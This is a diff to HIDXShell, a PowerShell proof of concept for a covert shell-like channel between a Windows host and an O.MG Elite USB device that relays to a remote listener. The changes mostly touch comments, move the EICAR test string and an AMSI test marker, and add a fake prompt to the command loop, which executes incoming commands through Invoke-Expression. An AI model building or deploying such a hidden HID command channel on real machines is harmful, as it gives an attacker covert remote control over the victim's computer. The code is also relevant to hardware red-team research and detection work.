@@ -9,7 +9,7 @@ Recommended Listener: stealthlink-client-universal.py
 function HIDXShell {
 <#
 .DESCRIPTION
-This powershell script is a PoC for a bidirectional, shell-like connection between a host and an O.MG Elite device, which acts as a bridge between Listener and USB-Host.
+This powershell script acts as a PoC for a bidirectional, shell-like connection between a host and an O.MG Elite device, which acts as a bridge between Listener and USB-Host.
 
 .PARAMETER VendorID
 Defining vendor ID of the device. (Default: D3C0)
@@ -29,10 +29,11 @@ https://github.com/0i41E
 https://github.com/spiceywasabi
 https://github.com/rogandawes
 https://github.com/O-MG/O.MG-Firmware/blob/stable/tools/HIDX/python/stealthlink-client-universal.py
+https://github.com/O-MG/O.MG-Firmware/wiki/HIDX-StealthLink---Windows-PowerShell---Shell
 
 #Credits to Rogan for idea of filehandle and device identification
-#AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386
 
+#AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386
 X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
 #>
 
@@ -207,6 +208,15 @@ namespace omg {
                         $in | Format-Hex
                     }
                     $output = Invoke-Expression $in|Out-String
+                    #If output is empty return fake prompt
+                    if ($output -eq '') {
+                        if ($VerbosePreference -eq 'Continue') {
+                            $output = "[+]Command successful!`n" #If verbose is set, return additional message
+                        } else {
+                            $output = "`n"
+                        }
+                    }
+
                 } Catch {
                     $output = Echo "[!]Error: The command was not recognized as the name of a cmdlet, a function, a script file or an executable program."|Out-String #Error message send to receiver
                     Write-Host -ForegroundColor red "[!]Error: Unable to run: $in" #Error message in console
